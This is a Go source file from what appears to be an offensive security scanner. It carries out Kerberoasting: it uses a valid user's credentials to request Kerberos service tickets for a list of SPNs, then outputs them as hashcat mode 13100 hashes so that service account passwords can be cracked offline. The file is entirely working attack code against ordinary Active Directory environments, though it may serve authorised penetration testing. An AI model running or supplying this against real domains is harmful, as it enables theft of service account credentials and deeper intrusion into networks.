package kerberos

import (
	"encoding/hex"
	"fmt"

	"github.com/chud-lori/ngehe/internal/finding"
	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/types"
)

// Kerberoast requests TGS tickets for each SPN using a valid TGT (from
// authenticated user + password). Returns hashcat krb5tgs format hashes.
func Kerberoast(kdcHost, realm, user, password string, spns []string) []finding.Finding {
	cfg, err := buildKrb5Conf(kdcHost, realm)
	if err != nil {
		return nil
	}
	cli := client.NewWithPassword(user, realm, password, cfg, client.DisablePAFXFAST(true))
	if err := cli.Login(); err != nil {
		return nil
	}
	defer cli.Destroy()

	var out []finding.Finding
	for _, spn := range spns {
		hash, err := roastSPN(cli, realm, spn)
		if err != nil {
			continue
		}
		out = append(out, finding.Finding{
			Rule: "kerberos-kerberoast", Severity: finding.SevHigh,
			Method:   "TCP",
			URL:      "kerberos://" + kdcHost,
			Path:     "/",
			Param:    "spn",
			Payload:  spn,
			Evidence: hash,
			Why:      "TGS for SPN obtained — feed to hashcat mode 13100 to recover service account password",
		})
	}
	return out
}

func roastSPN(cli *client.Client, realm, spn string) (string, error) {
	tgt, _, err := cli.GetServiceTicket(spn)
	if err != nil {
		return "", err
	}
	encPart := tgt.EncPart
	if encPart.Cipher == nil || len(encPart.Cipher) < 16 {
		return "", fmt.Errorf("cipher too short")
	}
	cipher := encPart.Cipher
	checksum := hex.EncodeToString(cipher[len(cipher)-16:])
	body := hex.EncodeToString(cipher[:len(cipher)-16])
	// hashcat krb5tgs mode 13100 format:
	// $krb5tgs$23$*user$realm$spn*$checksum$cipher
	return fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s$%s", cli.Credentials.UserName(), realm, spn, checksum, body), nil
}

var _ = nametype.KRB_NT_PRINCIPAL
var _ = types.PrincipalName{}
